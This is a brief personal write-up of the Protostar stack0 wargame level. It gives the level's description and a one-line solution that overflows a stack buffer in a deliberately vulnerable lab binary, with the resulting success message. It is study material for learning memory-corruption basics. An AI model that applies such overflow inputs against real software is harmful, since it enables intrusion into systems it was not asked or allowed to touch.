# Link
https://exploit-exercises.com/protostar/stack0/ 

This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution.

This level is at /opt/protostar/bin/stack0

# Solution
user@protostar:/opt/protostar/bin$ python -c 'print "a"*65' | ./stack0

you have changed the 'modified' variable 

# What I learned
